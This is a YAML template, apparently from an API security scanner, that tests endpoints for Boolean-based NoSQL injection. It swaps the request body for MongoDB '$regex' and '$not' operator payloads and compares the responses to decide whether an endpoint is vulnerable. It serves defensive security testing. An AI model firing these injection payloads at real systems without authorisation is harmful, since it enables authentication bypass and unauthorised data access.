id: NOSQLI_BOOLEAN_BASED_REPLACE_BODY
info:
  name: "Boolean Based NoSQL Injection test by replacing JSON body with Regex function parameter"
  description: >
    "This test involves exploiting a vulnerability in NoSQL databases by manipulating the JSON payload sent in a query. By substituting parts of the JSON body with a regular expression function parameter, an attacker can craft queries that alter the logic of the database query execution. This technique can reveal information or bypass security controls by leveraging how NoSQL databases handle and interpret regex patterns within their queries."
  details: >
    "In this test, attackers replace sections of a JSON payload with regex function parameters to exploit Boolean-based NoSQL injection vulnerabilities. This involves injecting malicious regex patterns into queries, potentially bypassing authentication or data validation mechanisms. By observing changes in the query's Boolean logic or response behavior, attackers can identify and manipulate the underlying database logic, leading to unauthorized access or data retrieval."
  impact: >
    "The impact of this NoSQL injection technique can be severe, as it may allow attackers to bypass authentication, gain unauthorized access to sensitive data, or manipulate database queries. By exploiting Boolean logic vulnerabilities, they can execute arbitrary queries, potentially leading to data breaches or corruption. Additionally, such vulnerabilities can compromise the overall security and integrity of the NoSQL database and its applications."
  category:
    name: INJECT
    shortName: Injection Attacks
    displayName: Injection Attacks (INJECT)
  subCategory: NOSQLI_BOOLEAN_BASED_REPLACE_BODY
  severity: CRITICAL
  tags:
    - Injection Attack
    - OWASP Top 10
    - HackerOne Top 10
  references:
    - "https://github.com/Charlie-belmer/nosqli"
    - "https://owasp.org/www-community/Injection_Flaws"
  cwe:
    - CWE-943
    - CWE-89
  cve:
    - CVE-2020-35847
    - CVE-2021-22911
    - CVE-2023-28359

attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST
compliance_standards: compliance/injecton-attacks.conf
remediation: remediation/NOSQLI_BOOLEAN_BASED_REPLACE_BODY.md
api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts

  method:
    not_contains:
      - OPTIONS
      - GET
execute:
  type: multiple
  requests:
    - req:
        - replace_body: "{\"$regex\" : \"a^\" }"
        - validate:
            or:
              - response_code:
                  gte: 400
                  lt: 410
              - response_payload:
                  length:
                    gt: 0
                  not_contains:
                    - Error
                    - fail
                    - invalid
                    - expired
                    - not found
                    - account is locked
                    - account is blocked
                    - rate-limit
                    - rate_limit
                    - rate limit
                    - multiple failed attempt
                    - cloudflare
                    - <html>
                    - </html>
        - success: x2
        - failure: exit
    - req:
        - replace_body: "{\"$regex\" : \".*\" }"
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              neq: "${x1.response.body}"
              not_contains:
                - rate-limit
                - rate limit
                - rate_limit
                - account is locked
                - account is blocked
                - multiple failed attempt
                - cloudflare
                - fail
                - invalid
                - <html>
                - </html>
        - success: x3
        - failure: exit
    - req:
        - add_header:
            dummyHeader: dummyValue
        - replace_body: "{\"field\": {\"$not\": {\"$regex\": \"a^\"}}}"
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              eq: "${x2.response.body}"
              not_contains:
                - rate-limit
                - rate limit
                - rate_limit
                - account is locked
                - account is blocked
                - multiple failed attempt
                - cloudflare
                - invalid
                - fail
                - <html>
                - </html>
        - success: vulnerable
        - failure: exit
